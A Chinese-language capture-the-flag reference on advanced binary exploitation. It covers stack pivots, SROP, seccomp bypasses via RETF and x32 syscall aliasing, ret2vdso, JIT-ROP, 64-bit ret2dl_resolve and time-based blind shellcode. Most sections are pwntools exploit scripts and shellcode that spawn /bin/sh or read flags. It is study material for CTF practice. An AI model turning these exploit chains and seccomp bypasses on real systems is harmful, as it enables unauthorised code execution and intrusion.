# CTF Pwn - 高级 ROP 技巧

## 目录
- [通过 leave;ret 双重栈枢轴到 BSS（Midnightflag 2026）](#double-stack-pivot-to-bss-via-leaveret-midnightflag-2026)
- [带 UTF-8 Payload 限制的 SROP（DiceCTF 2026）](#srop-with-utf-8-payload-constraints-dicectf-2026)
- [Seccomp 绕过](#seccomp-bypass)
- [用于 Seccomp 绕过的 RETF 架构切换（Midnightflag 2026）](#retf-architecture-switch-for-seccomp-bypass-midnightflag-2026)
- [带输入反转的栈上 shellcode](#stack-shellcode-with-input-reversal)
- [.fini_array 劫持](#fini_array-hijack)
- [pwntools 模板](#pwntools-template)
  - [通过 Corefile 自动寻找偏移（Crypto-Cat）](#automated-offset-finding-via-corefile-crypto-cat)
- [ret2vdso — 利用内核 vDSO gadget（HTB Nowhere to go）](#ret2vdso--using-kernel-vdso-gadgets-htb-nowhere-to-go)
  - [步骤 1 — 栈泄露](#step-1--stack-leak)
  - [步骤 2 — 写入 `/bin/sh` 到已知地址](#step-2--write-binsh-to-known-address)
  - [步骤 3 — 通过 AT_SYSINFO_EHDR 找到 vDSO 基址](#step-3--find-vdso-base-via-at_sysinfo_ehdr)
  - [步骤 4 — 转储 vDSO 并寻找 gadgets](#step-4--dump-vdso-and-find-gadgets)
  - [步骤 5 — execve ROP 链](#step-5--execve-rop-chain)
- [用于 PIE 绕过的 Vsyscall ROP（Hack.lu 2015）](#vsyscall-rop-for-pie-bypass-hacklu-2015)
- [用于 Seccomp 绕过的 x32 ABI 系统调用号别名（BCTF 2017）](#x32-abi-syscall-number-aliasing-for-seccomp-bypass-bctf-2017)
- [write() 被阻止时的基于时间的盲 shellcode（DEF CON 2017）](#time-based-blind-shellcode-when-write-blocked-def-con-2017)
- [JIT-ROP：在泄露的 libc 函数中扫描 syscall 字节（Codegate 2018）](#jit-rop-scan-for-syscall-byte-in-leaked-libc-function-codegate-2018)
- [64 位 ret2dl_resolve（Codegate 2018）](#ret2dl_resolve-64-bit-codegate-2018)
- [通过哥德巴赫分解的仅素数 ROP（PlaidCTF 2018）](#prime-only-rop-via-goldbach-decomposition-plaidctf-2018)
- [不完美 gadget 栈枢轴（RITSEC 2018）](#imperfect-gadget-stack-pivot-ritsec-2018)
- [_fini_array 双入口分阶段 ROP（Insomnihack 2019）](#_fini_array-double-entry-staged-rop-insomnihack-2019)
- [通过静态链接 libc + 嵌入的 /bin/sh 字符串实现 ret2libc（TAMUctf 2019）](#ret2libc-via-statically-linked-libc--embedded-binsh-string-tamuctf-2019)
- [实用命令](#useful-commands)

关于核心 ROP 链构建、ret2csu、坏字符绕过、特殊 gadgets 以及通过 xchg 的栈枢轴，请参见 [rop-and-shellcode.md](rop-and-shellcode.md)。

---

## 通过 leave;ret 双重栈枢轴到 BSS（Midnightflag 2026）

**模式（Eyeless）：** 小型栈溢出（缓冲区后 22 字节）——足以覆盖 RBP + RIP，但不足以放置完整 ROP 链。无 libc 泄露。使用两个 `leave; ret` 枢轴将执行流重定位到 BSS，然后链式调用 `fgets` 写入任意长度的 ROP。

**阶段 1 — 枢轴到 BSS：**
```python
BSS_STAGE = 0x404500  # 可写的 BSS 地址
LEAVE_RET = 0x4013d9  # leave; ret gadget

# 溢出：128 字节缓冲区 + RBP + RIP
payload = b'A' * 128
payload += p64(BSS_STAGE)   # 覆盖 RBP → BSS
payload += p64(LEAVE_RET)   # leave 设置 RSP = RBP (BSS)，然后 ret
```

**阶段 2 — 链式调用 fgets 读取大 ROP：**
```python
# 枢轴后，RSP 位于 BSS_STAGE。预先放置一个小型 ROP，
# 调用 fgets(BSS+0x600, 0x700, stdin) 读取真正的 ROP 链：
POP_RDI = 0x4013a5
POP_RSI_R15 = 0x4013a3
SET_RDX_STDIN = 0x40136a  # 设置 rdx = stdin FILE* 的 gadget

stage2 = flat(
    SET_RDX_STDIN,
    POP_RDI, BSS_STAGE + 0x100,  # 目标缓冲区
    POP_RSI_R15, 0x700, 0,       # 大小
    elf.plt['fgets'],             # fgets(buf, 0x700, stdin)
    BSS_STAGE + 0x100,            # 返回到新的 ROP 链
)
```

**关键洞察：** `leave; ret` 等价于 `mov rsp, rbp; pop rbp; ret`。覆盖 RBP 控制 `leave` 后 RSP 的位置。两个枢轴解决了“溢出太小无法放置完整 ROP 链”的问题：第一个枢轴跳转到 BSS，那里有一个小型引导 ROP 调用 `fgets` 加载完整的利用链。

**适用场景：** 溢出太小无法放置完整 ROP 链，且二进制使用 `fgets`/`read`（或类似输入函数）且可通过 PLT 调用。BSS 总是可写且地址已知（无 PIE 或 PIE 泄露）。

---
## 带 UTF-8 Payload 限制的 SROP（DiceCTF 2026）

**模式（消息存储）：** Rust 二进制程序中，OOB 颜色索引读取 GOT 中的 memcpy，导致 `memcpy(stack, BUFFER, 0x1000)` —— 一个巨大的栈溢出。但 `from_utf8_lossy()` 会先验证缓冲区：任何无效的 UTF-8 都会触发 `Cow::Owned` 并带有损坏的替换数据。**整个 0x1000 字节的 payload 必须是有效的 UTF-8。**

**为何用 SROP：** 普通的 ROP gadget 地址包含大于 0x7f 的字节，这些字节不是有效的单字节 UTF-8。SROP 只需要 3 个 gadget（设置 rax=15，调用 syscall）来触发 `sigreturn`，然后信号帧设置所有寄存器以执行 `execve("/bin/sh", NULL, NULL)`。

**UTF-8 多字节跨字段技巧：** 信号帧中的寄存器字段每个 8 字节，连续打包。一个 3 字节的 UTF-8 序列可以从一个字段开始，在下一个字段结束：

```python
from pwn import *

# r15 是 sigframe 中紧挨着 rdi 之前的字段
# rdi = 指向 "/bin/sh" 的指针 = 0x2f9fb0 → 字节 [B0, 9F, 2F, ...]
# B0, 9F 是 UTF-8 的续字节（10xxxxxx）——作为序列起始无效
# 解决方案：将 r15 的最后一个字节设为 0xE0（3 字节 UTF-8 头字节）
# E0 B0 9F = 有效 UTF-8（U+0C1F），跨越 r15→rdi 边界

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = buf_addr + 0x178  # "/bin/sh\0" 的地址
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.r15 = 0xE000000000000000  # 最后一个字节 0xE0 启动 3 字节 UTF-8 序列

# ROP 前奏：3 个 UTF-8 安全的 gadget
payload = b'\x00' * 0x48           # 填充到返回地址
payload += p64(pop_rax_ret)        # 设置 rax = 15 (sigreturn)
payload += p64(15)
payload += p64(syscall_ret)        # 触发 sigreturn
payload += bytes(frame)
# 在 BUFFER 的偏移 0x178 处放置 "/bin/sh\0"
```

**使用场景：** 任何 payload 字节必须通过 UTF-8 验证的漏洞利用（Rust `String`，`from_utf8`，JSON 解析器）。SROP 最小化了必须是 UTF-8 安全的 gadget 地址数量。

**关键洞察：** 多字节 UTF-8 序列（2-4 字节）可以跨越结构化数据中的相邻字段（信号帧、ROP 链）。将头字节（0xC0-0xF7）设置为一个字段的最后一个字节，使得下一个字段中的续字节（0x80-0xBF）形成有效序列。

## Seccomp 绕过

当 seccomp 阻止 `open()`/`read()` 时的替代 syscall：
- `openat()` (257), `openat2()` (437，常被忽略！), `sendfile()` (40), `readv()`/`writev()`

**检查规则：** `seccomp-tools dump ./binary`

详见 [advanced.md](advanced.md)：条件缓冲区地址限制、无重定位的 shellcode 构造（call/pop 技巧）、从反汇编分析 seccomp、`scmp_arg_cmp` 结构布局。

## RETF 架构切换绕过 Seccomp（Midnightflag 2026）

**模式（Eyeless）：** Seccomp 在 64 位模式下阻止 `execve`、`execveat`、`open`、`openat`。切换到 32 位（IA-32e 兼容模式），此时 syscall 编号不同且过滤器不生效。

**原理：** `retf`（远返回）指令从栈中弹出 RIP 和 CS。设置 `CS = 0x23` 切换 CPU 到 32 位兼容模式。32 位模式下，`int 0x80` 使用不同的 syscall 编号：`open=5`，`read=3`，`write=4`，`exit=1`。

**切换模式的 ROP 链：**
```python
POP_RDX_RBX = libc_base + 0x8f0c5  # pop rdx; pop rbx; ret
POP_RDI     = 0x4013a5
POP_RSI_R15 = 0x4013a3
RETF        = libc_base + 0x294bf   # libc 中的 retf gadget

# 第一步：将 BSS 区域 mprotect 为 RWX 以执行 shellcode
rop  = flat(POP_RDI, 0x404000)          # 地址 = BSS 页
rop += flat(POP_RSI_R15, 0x1000, 0)     # 大小 = 一页
rop += flat(POP_RDX_RBX, 7, 0)          # 权限 = RWX
rop += flat(libc_base + libc.sym.mprotect)

# 第二步：远返回到 BSS 上的 32 位 shellcode
rop += flat(RETF)
rop += p32(0x404a80)   # 32 位 EIP（BSS 上的 shellcode 地址）
rop += p32(0x23)        # CS = 0x23（IA-32e 兼容模式）
```

**32 位 shellcode（打开/读取/写出 flag）：**
```nasm
mov esp, 0x404100       ; 设置 32 位栈
push 0x67616c66         ; "flag"（反序）
push 0x2f2f2f2f         ; "////"
mov ebx, esp            ; ebx = 文件名指针

mov eax, 5              ; SYS_open (32 位)
xor ecx, ecx            ; O_RDONLY
int 0x80                ; open("////flag", O_RDONLY)

mov ebx, eax            ; open 返回的 fd
mov ecx, esp            ; 缓冲区
mov edx, 0x100          ; 大小
mov eax, 3              ; SYS_read (32 位)
int 0x80

mov edx, eax            ; 读取字节数
mov ecx, esp            ; 缓冲区
mov ebx, 1              ; 标准输出
mov eax, 4              ; SYS_write (32 位)
int 0x80

mov eax, 1              ; SYS_exit
int 0x80
```

**关键洞察：** 针对 `AUDIT_ARCH_X86_64` 配置的 seccomp 过滤器不会检查 32 位的 `int 0x80` syscall。`retf` gadget（在 libc 中找到）通过加载 CS=0x23 切换架构。需要先通过 `mprotect` 使内存区域可执行，因为 32 位 shellcode 必须从可写可执行内存运行。

**在 libc 中查找 retf：**
```bash
ROPgadget --binary libc.so.6 | grep retf
# 或搜索字节 0xcb：
objdump -d libc.so.6 | grep -w retf
```

**使用场景：** Seccomp 阻止关键的 64 位 syscall（`open`、`openat`、`execve`），但未使用 `SECCOMP_FILTER_FLAG_SPEC_ALLOW` 或检查 `AUDIT_ARCH`。结合 `mprotect` 使 BSS/堆可执行以运行 32 位 shellcode。

---
## Stack Shellcode with Input Reversal

**模式（Scarecode）：** 二进制在返回之前会反转输入缓冲区。

**策略：**
1. 通过信息泄露命令泄露地址（绕过 PIE）
2. 找到 `sub rsp, 0x10; jmp *%rsp` gadget
3. 预先反转 shellcode 和 RIP 覆盖字节
4. 使用部分 6 字节 RIP 覆盖（避免规范地址中的空字节）
5. 放置跳板（`jmp short`）跳回 NOP sled + shellcode

**使用 `scanf("%s")` 避免空字节：**
- 载荷中不能嵌入 `\x00`
- 使用部分指针覆盖（6 字节）——高 2 字节相同，因为映射相同
- 使用短跳转和 NOP sled 代替多地址 ROP 链

## .fini_array 劫持

**使用时机：** 可写的 `.fini_array` + 任意写原语。当 `main()` 返回时，条目作为函数指针被调用。即使开启 Full RELRO 也有效。

```python
# 查找 .fini_array 地址
fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
# 或者：objdump -h binary | grep fini_array

# 使用格式化字符串 %hn（2 字节写入）覆盖
writes = {
    fini_array: target_addr & 0xFFFF,
    fini_array + 2: (target_addr >> 16) & 0xFFFF,
}
```

**相较于 GOT 覆盖的优势：** 即使开启 Full RELRO 也有效（`.fini_array` 在不同段）。结合 RWX 区域用于 shellcode 时尤其有用。

## pwntools 模板

```python
from pwn import *

context.binary = elf = ELF('./binary')
context.log_level = 'debug'

def conn():
    if args.GDB:
        return gdb.debug([exe], gdbscript='init-pwndbg\ncontinue')
    elif args.REMOTE:
        return remote('host', port)
    return process('./binary')

io = conn()
# 在此处编写利用代码
io.interactive()
```

### 通过 Corefile 自动查找偏移（Crypto-Cat）

自动确定缓冲区溢出偏移，无需手动 `cyclic -l`：
```python
def find_offset(exe):
    p = process(exe, level='warn')
    p.sendlineafter(b'>', cyclic(500))
    p.wait()
    # x64：从栈指针读取保存的 RIP
    offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    # x86：直接使用 pc
    # offset = cyclic_find(p.corefile.pc)
    log.warn(f'Offset: {offset}')
    return offset
```

**关键点：** pwntools 会自动从崩溃进程生成 core 文件。读取 `corefile.sp`（x64）或 `corefile.pc`（x86）中的保存返回地址，传给 `cyclic_find()` 即可得到准确偏移，免去手动 GDB 检查。

## ret2vdso — 利用内核 vDSO Gadgets（HTB Nowhere to go）

**模式：** 静态链接二进制，函数极少且无有用 ROP gadget（无 `pop rdi`、`pop rsi`、`pop rax` 等）。Linux 内核为每个进程映射一个 vDSO（虚拟动态共享对象），其中包含足够的 gadget 用于 `execve`。

### 第 1 步 — 栈泄露

溢出缓冲区并读取比发送更多的字节以泄露栈指针：
```python
p.send(b'A' * 0x20)
resp = p.recv(0x80)
leak = u64(resp[0x30:0x38])
stackbase = (leak & 0x0000FFFFFFFFF000) - 0x20000
```

### 第 2 步 — 将 `/bin/sh` 写入已知地址

通过 ROP 使用二进制自身的 `read` 函数，将 `/bin/sh\0` 放置在页对齐的栈地址：
```python
payload = b'B' * 32 + p64(READ_FUNC) + p64(LOOP) + p64(0x8) + p64(stackbase)
p.sendline(payload)
p.send(b'/bin/sh\x00')
```

### 第 3 步 — 通过 AT_SYSINFO_EHDR 查找 vDSO 基址

使用二进制的 `write` 函数转储栈内容。搜索 `AT_SYSINFO_EHDR`（auxv 类型 `0x21`），该项保存 vDSO 基址：
```python
# 从 stackbase 转储 0x21000 字节
for i in range(0, len(stackdump) - 15, 8):
    val = u64(stackdump[i:i+8])
    if val == 0x21:  # AT_SYSINFO_EHDR
        next_val = u64(stackdump[i+8:i+16])
        if 0x7f0000000000 <= next_val <= 0x7fffffffffff and (next_val & 0xFFF) == 0:
            vdso_base = next_val
            break
```
### 第4步 — Dump vDSO 并寻找 gadgets

使用二进制的 `write` 函数从 `vdso_base` 处 dump 0x2000 字节，然后搜索 gadgets。常见的 vDSO gadgets：
```python
POP_RDX_RAX_RET     = vdso_base + 0xba0  # pop rdx; pop rax; ret
POP_RBX_R12_RBP_RET = vdso_base + 0x8c6  # pop rbx; pop r12; pop rbp; ret
MOV_RDI_RBX_SYSCALL = vdso_base + 0x8e3  # mov rdi, rbx; mov rsi, r12; syscall
```

### 第5步 — execve ROP 链

```python
payload = b'A' * 32
payload += p64(POP_RDX_RAX_RET)
payload += p64(0x0)              # rdx = NULL (envp)
payload += p64(59)               # rax = execve
payload += p64(POP_RBX_R12_RBP_RET)
payload += p64(stackbase)        # rbx → rdi = &"/bin/sh"
payload += p64(0x0)              # r12 → rsi = NULL (argv)
payload += p64(0xdeadbeef)       # rbp (dummy)
payload += p64(MOV_RDI_RBX_SYSCALL)
```

**关键洞察：** vDSO 是内核特定的——不同内核的 gadget 偏移不同。总是 dump 远程 vDSO，而不是假设本地偏移。栈上的 auxv `AT_SYSINFO_EHDR`（类型 0x21）是找到 vDSO 基址的可靠方法。

**检测：** 静态链接的二进制，函数少，无 libc，也无有用的 gadgets。QEMU 托管的挑战通常运行自定义内核，vDSO 布局独特。

---

## Vsyscall ROP 用于 PIE 绕过（Hack.lu 2015）

在较旧的 Linux 内核上，vsyscall 页固定映射在地址 (`0xffffffffff600000-0xffffffffff601000`)，无论 ASLR/PIE 如何。每个 vsyscall 条目以 `ret` 结尾，提供已知地址的 gadgets：

- `0xffffffffff600000` — gettimeofday（ret 在 +0x9）
- `0xffffffffff600400` — time（ret 在 +0x9）
- `0xffffffffff600800` — getcpu（ret 在 +0x9）

使用 vsyscall 的 `ret` gadgets 将栈滑动到部分返回地址覆盖：

```python
from pwn import *

payload = b'A' * 72                      # 填充到返回地址
payload += p64(0xffffffffff600400)        # vsyscall time：充当 NOP-ret
payload += p64(0xffffffffff600400)        # 第二个 NOP-ret 用于对齐
payload += b"\x8b\x10"                    # 部分覆盖目标（2 字节）
```

**关键洞察：** 即使启用 PIE+ASLR，vsyscall 地址仍固定。现代内核模拟 vsyscall（陷入内核），但地址依然可预测。可用 `cat /proc/self/maps | grep vsyscall` 检查。

**注意：** 一些新内核完全禁用 vsyscall（`vsyscall=none`）。使用前请确认可用性。

---

## x32 ABI 系统调用号别名用于 Seccomp 绕过（BCTF 2017）

**模式：** Linux x32 ABI（64位内核上的32位指针）使用带有第30位（`0x40000000`）的系统调用号。大多数 seccomp BPF 过滤器只检查低32位与已知系统调用号匹配，忽略了 x32 变体。

```c
// 标准 execve 被 seccomp 阻止：系统调用号 59
// x32 ABI 变体：系统调用号 0x40000000 | 59 = 0x4000003B
// 通常能通过只检查 59 的 BPF 过滤器
syscall(0x4000003B, "/bin/sh", NULL, NULL);
```

```python
from pwn import *

# 使用 x32 ABI 系统调用号绕过 seccomp 的 ROP 链
pop_rax = libc_base + rax_gadget
pop_rdi = libc_base + rdi_gadget
pop_rsi = libc_base + rsi_gadget
pop_rdx = libc_base + rdx_gadget
syscall_ret = libc_base + syscall_gadget

rop = flat(
    pop_rax, 0x4000003B,              # x32 execve（绕过 seccomp）
    pop_rdi, binsh_addr,              # "/bin/sh"
    pop_rsi, 0,                       # argv = NULL
    pop_rdx, 0,                       # envp = NULL
    syscall_ret,                      # 触发 x32 execve
)
```

**关键洞察：** x32 ABI 会在系统调用号中 OR 上 `0x40000000`。Seccomp 过滤器检查 `SCMP_ACT_KILL` 针对 `__NR_execve`（59）时，忽略了 `__NR_execve | __X32_SYSCALL_BIT`（0x4000003B），内核仍然将其分派到相同处理程序。此方法适用于启用 `CONFIG_X86_X32=y` 的内核（旧发行版常见）。

**识别时机：** Seccomp 过滤器通过精确匹配或范围检查阻止特定系统调用号。用 `seccomp-tools dump ./binary` 导出 BPF，检查是否验证了 `AUDIT_ARCH` 或在比较前屏蔽了 x32 位。如果都没有，x32 别名可绕过过滤。

**缓解检查：** 现代 seccomp 策略使用 `SECCOMP_RET_KILL_PROCESS` 并显式验证 `AUDIT_ARCH_X86_64`，阻止此技术。

**参考：** BCTF 2017

---
## 当 write() 被阻塞时的基于时间的盲注 Shellcode（DEF CON 2017）

**模式：** 当 seccomp 阻止所有输出系统调用（`write`、`sendto`、`writev`）时，使用时间侧信道逐字符泄露 flag 数据：将每个字节与猜测值比较，匹配时循环等待。

```nasm
; 读取 flag 到缓冲区，然后比较第 N 个字符
; 假设 flag 已通过允许的 read() 系统调用读入 rsi
mov al, [rsi + N]      ; flag 的第 N 个字节
cmp al, 0x41           ; 与猜测字符 'A' 比较
jne done               ; 不匹配则跳过
; 时间循环：匹配时消耗约 4 秒
xor ecx, ecx
.loop: inc ecx
cmp ecx, 0xffffffff
jne .loop
done: xor edi, edi
mov eax, 60            ; exit 系统调用号
syscall
```

```python
from pwn import *
import time

FLAG_LEN = 40
CHARSET = string.printable

def guess_byte(offset, guess_char):
    """发送 shellcode，如果 flag[offset] == guess_char 则延迟"""
    sc = shellcraft.amd64.linux.open("flag.txt", 0)
    sc += shellcraft.amd64.linux.read("rax", "rsp", 100)
    sc += f"""
        mov al, byte ptr [rsp + {offset}]
        cmp al, {ord(guess_char)}
        jne done
        xor ecx, ecx
    loop:
        inc ecx
        cmp ecx, 0xffffffff
        jne loop
    done:
        xor edi, edi
        mov eax, 60
        syscall
    """
    r = remote(host, port)
    r.send(asm(sc))
    start = time.time()
    try:
        r.recvall(timeout=6)
    except:
        pass
    elapsed = time.time() - start
    r.close()
    return elapsed > 3.0  # 响应时间超过 3 秒则匹配成功

flag = ""
for i in range(FLAG_LEN):
    for c in CHARSET:
        if guess_byte(i, c):
            flag += c
            print(f"当前 flag: {flag}")
            break
```

**关键洞察：** 当 seccomp 阻止所有写相关系统调用（`write`、`sendto`、`writev`）时，仍可通过将 flag 字节与猜测值比较并在匹配时消耗 CPU 时间来泄露该字节。响应时间差异（即时响应 vs 约 4 秒延迟）揭示猜测是否正确。最坏情况下需要最多 256 * flag 长度的连接次数，但可打印 ASCII 字符集将其减少到约 95 * flag 长度。

**识别时机：** seccomp 允许 `open`/`read`，但阻止所有写相关系统调用。也适用于二进制文件完全无输出路径的情况（如嵌入式系统、裸机挑战）。

**参考资料：** DEF CON 2017

---

## JIT-ROP：扫描泄露 libc 函数中的 syscall 字节（Codegate 2018）

**模式：** 不通过识别远程 libc 版本来寻找 gadget，而是泄露 GOT 条目（如 `read@GOT`），然后读取该函数的机器码以找到其中的 `syscall` 指令。利用 `read()` 的返回值控制 `rax` 作为 syscall 编号。

**利用示例：**
```python
from pwn import *

# 第一步：通过格式化字符串/任意读泄露 read@GOT 地址
read_addr = leak_got(elf.got['read'])
log.info(f"read() 地址 @ {hex(read_addr)}")

# 第二步：读取 read() 函数体内的字节
# 使用任意读原语（如格式化字符串 %s，或 read() 本身）
read_bytes = read_memory(read_addr, 0x100)

# 第三步：在 read() 中找到 syscall 操作码 (0x0f 0x05)
syscall_offset = read_bytes.index(b'\x0f\x05')
syscall_addr = read_addr + syscall_offset
log.info(f"syscall 指令 @ {hex(syscall_addr)}")

# 第四步：用 syscall 地址覆盖一个未使用的 GOT 条目（如 srand）
write_got(elf.got['srand'], syscall_addr)

# 第五步：构造通过 syscall 执行 execve 的 ROP 链
# 技巧：read() 返回值设置 rax，故读取恰好 59 字节以设置 __NR_execve
pop_rdi = rop_gadget  # pop rdi; ret
pop_rsi = rop_gadget  # pop rsi; ret
pop_rdx = rop_gadget  # pop rdx; ret

payload = flat(
    pop_rdi, 0,                    # fd = stdin
    pop_rsi, bss_addr,             # buf = 可写 BSS
    pop_rdx, 59,                   # count = 59 = __NR_execve
    elf.plt['read'],               # read(0, bss, 59) → rax = 59
    pop_rdi, binsh_addr,           # rdi = "/bin/sh"
    pop_rsi, 0,                    # rsi = NULL
    pop_rdx, 0,                    # rdx = NULL
    elf.plt['srand'],              # 调用 syscall（GOT 已被覆盖）
    # rax=59, rdi="/bin/sh", rsi=0, rdx=0 → execve("/bin/sh", NULL, NULL)
)
io.sendline(payload)

# 发送恰好 59 字节，使 read() 返回 59（设置 rax = __NR_execve）
io.send(b'A' * 59)
```

**为何 read() 总包含 syscall：**
```text
libc 中的 read() 是 syscall 指令的薄封装：
  mov eax, 0        ; SYS_read
  syscall            ; <-- 这就是我们要扫描的指令
  cmp rax, -4096
  ...
read() 内必定包含字节 0x0f 0x05（syscall）
```

**关键洞察：** 每个 libc 函数的代码段都包含有用的 gadget。`read()` 内部总包含 `syscall` 指令。通过泄露 GOT 条目并读取函数机器码，无需知道 libc 版本即可找到 `syscall`。`read()` 的返回值自然设置 `rax` 为读取字节数——发送恰好 59 字节（`__NR_execve`）即可设置 syscall 编号。这样就不需要 `pop rax; ret` gadget。

**识别时机：** 部分 RELRO（GOT 可写），无 libc 版本信息，但可泄露 GOT 条目并任意读内存。任何内部执行 syscall 的函数（`read`、`write`、`open`、`mmap`）都包含 `0f 05` 字节。优先选择 `read()`，因为其返回值自然控制 `rax`。

**参考资料：** Codegate 2018

---
## ret2dl_resolve 64位（Codegate 2018）

**模式：** 在可写内存（BSS）中伪造假的 `Elf64_Rela`、`Elf64_Sym` 和 dynstr 条目，欺骗动态链接器解析任意 libc 函数（例如 `system`），而无需知道 libc 基址。64位版本需要通过将 link_map 中的版本表指针置空来绕过 VERSYM 检查。

**动态解析工作原理：**
```text
PLT stub → _dl_runtime_resolve(link_map, reloc_index)
  1. 查找 .rela.plt[reloc_index] 处的 Elf64_Rela
  2. 从 r_info 中提取符号索引
  3. 查找 .dynsym[sym_index] 处的 Elf64_Sym
  4. 从 .dynstr + st_name 偏移读取符号名
  5. 在已加载库中搜索该符号名
  6. [仅64位] 通过 .gnu.version[sym_index] 检查版本  ← 必须绕过
  7. 将解析后的地址写入 GOT，跳转到该地址
```

**伪造结构体：**
```python
from pwn import *

# 目标：通过在 BSS 中伪造解析结构体来解析 system()
BSS = 0x601000          # 可写内存
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

# 计算偏移，使伪造结构自洽
fake_rela_addr = BSS + 0x100
fake_sym_addr = BSS + 0x200
fake_str_addr = BSS + 0x300

# 伪造 Elf64_Sym（24字节）
# st_name：dynstr 中 "system\x00" 的偏移
# st_info：STT_FUNC | STB_GLOBAL
# st_other, st_shndx：0
# st_value, st_size：0（未解析）
sym_index = (fake_sym_addr - SYMTAB) // 24  # symtab 中的索引
fake_sym = flat(
    p32(fake_str_addr - STRTAB),  # st_name（指向 dynstr 中 "system" 的偏移）
    p8(0x12),                      # st_info = STT_FUNC | STB_GLOBAL<<4
    p8(0),                         # st_other
    p16(0),                        # st_shndx = SHN_UNDEF
    p64(0),                        # st_value
    p64(0),                        # st_size
)

# 伪造 Elf64_Rela（24字节）
# r_offset：写入解析地址的 GOT 槽位
# r_info：(sym_index << 32) | R_X86_64_JUMP_SLOT
# r_addend：0
reloc_index = (fake_rela_addr - JMPREL) // 24
fake_rela = flat(
    p64(BSS + 0x400),                      # r_offset（可写 GOT 槽位）
    p64((sym_index << 32) | 7),            # r_info：sym_idx | R_X86_64_JUMP_SLOT
    p64(0),                                 # r_addend
)

# 伪造 dynstr 条目
fake_str = b"system\x00"

# 通过 ROP 链写入所有结构到 BSS
# ...

# 关键：绕过64位的 VERSYM 检查
# 将 link_map->l_info[DT_VERSYM] 覆盖为 NULL
# 这样完全跳过版本验证
# link_map 地址可从 GOT[1] 读取
link_map_addr = read_got(1)  # GOT[1] = link_map 指针
# l_info[DT_VERSYM] 位于 link_map + 0x1c8（依赖 glibc 版本）
versym_ptr = link_map_addr + 0x1c8
write_memory(versym_ptr, p64(0))  # NULL → 跳过版本检查

# 触发解析：调用带伪造 reloc_index 的 PLT stub
# _dl_runtime_resolve 按照伪造链执行：
#   伪造 Rela → 伪造 Sym → 伪造 dynstr "system"
#   → 解析 system() → 写入伪造 GOT 槽 → 跳转到 system()
```

**触发的 ROP 链：**
```python
# 在写入伪造结构到 BSS 后：
# 压入 reloc_index 并跳转到 PLT[0]（通用解析器 stub）
plt_stub = elf.get_section_by_name('.plt').header.sh_addr

payload = flat(
    pop_rdi, binsh_addr,           # rdi = "/bin/sh" 作为 system() 参数
    plt_stub,                       # 压入 link_map；跳转 _dl_runtime_resolve
    p64(reloc_index),              # 伪造 .rela.plt 中的重定位索引
)
```

**关键洞察：** 64位 ret2dl_resolve 比 32位更难，因为有 VERSYM 检查。通过将 `link_map->l_info[DT_VERSYM]` 覆盖为 NULL，完全跳过版本验证。然后使用标准方法：在可写内存中伪造 Rela -> Sym -> dynstr 链，通过带伪造重定位索引的 PLT stub 触发解析。这样无需知道 libc 基址即可解析任意 libc 函数——动态链接器帮你完成。

**识别时机：** 无 libc 泄露，Partial RELRO（PLT/GOT 可写），二进制有足够 ROP gadget 写入 BSS 并控制函数参数。适用于任何 glibc 版本（通过 NULL 绕过 VERSYM 是通用方法）。当远程 libc 版本完全未知时，优先考虑此法而非盲目识别 libc。

**参考资料：** Codegate 2018

---
## 仅质数 ROP 通过哥德巴赫分解 (PlaidCTF 2018)

**模式：** 挑战限制攻击者写入的每个栈字必须是质数（`miller_rabin(val)` 对每个槽位都必须返回 true）。直接的 gadget 地址几乎从不是质数，因此看似无法构建 ROP 链。

**利用方法：** 哥德巴赫猜想保证每个大于 2 的偶数都可以表示为两个质数之和。将每个目标 gadget 地址 `g` 表示为 `g = p1 + p2`，其中 `p1, p2` 是质数，并将它们写入相邻的栈槽。一个小的“质数加法器” gadget（`pop rax; pop rdx; add rax, rdx; push rax; ret` 或者对栈的读-改-写操作）在消费该 gadget 的 `ret` 之前，将这两个部分合并成真正的 gadget 指针。

```python
from sympy import isprime, nextprime

def prime_split(addr):
    # 返回 (p1, p2)，满足 p1 + p2 == addr 且两者均为质数
    if addr % 2:  # 奇数：如果 addr-2 是质数，则为 (2, addr-2)，否则搜索
        if isprime(addr - 2): return (2, addr - 2)
    p1 = 3
    while not (isprime(p1) and isprime(addr - p1)):
        p1 = nextprime(p1)
    return (p1, addr - p1)
```

将多个 `(p1, p2, adder)` 三元组链式组合，合成任意 gadget 地址，同时每个原始栈字仍通过质数检测。

**关键洞见：** 对栈内容的数论约束总能通过将一个值写成允许部分的和/XOR/积，并添加一个小的合并 gadget 在运行时重组来破解。哥德巴赫提供了地址的构造性两项分解；拉格朗日四平方定理对要求完全平方数的约束同样适用。

**参考：** PlaidCTF 2018 — writeup 10017

---

## 不完美 Gadget 栈枢轴 (RITSEC 2018)

**模式：** 经典的栈枢轴使用 `leave; ret` 或 `xchg esp, eax; ret`，但有时唯一可用的 gadget 中间包含无害指令。像 `pop ebp; add al, 0x89; pop esp; and al, 0x30; add esp, 0x24; ret` 这样的 gadget 仍然能枢轴 `esp` —— `add al`/`and al` 的副作用不会破坏 `esp`，尾部的 `add esp, 0x24` 只是跳过你预先填充的 9 个槽的垃圾数据。

```asm
0x80c0620: pop ebp ; add al, 0x89 ; pop esp ; and al, 0x30 ; add esp, 0x24 ; ret
```

将一个受控的堆地址放在正确的槽位，使 `pop esp` 跳转到伪造的栈，然后在真实链之前预留九个虚拟 dword 来吸收 `add esp, 0x24`。

**关键洞见：** 不要因为 gadget 有噪声就拒绝它。逐条检查 gadget 指令；只要没有指令破坏 `esp`，即使有多余的算术操作，gadget 仍然能枢轴。

**参考：** RITSEC CTF 2018 — Yet Another HR Management Framework，writeup 12287

---

## _fini_array 双重入口分阶段 ROP (Insomnihack 2019)

**模式：** 静态链接的二进制没有可劫持的 PLT/GOT。然而，`_fini_array` 存储了在 `exit()` 时调用的指针。覆盖两个条目，使第一次调用运行 `do_overwrite`（一个允许你分阶段写入更多字节的 gadget），第二次调用再次运行它，从而让你在连续的退出中逐步追加 ROP。

```text
_fini_array[0] = do_overwrite   # 阶段 1：写入下一段
_fini_array[1] = do_overwrite   # 阶段 2：写入最终段 + 触发
```

使用 `add rsp, N; ret` 枢轴向下遍历当前 `rsp`，使每个阶段都连接到前一个 ROP 帧。

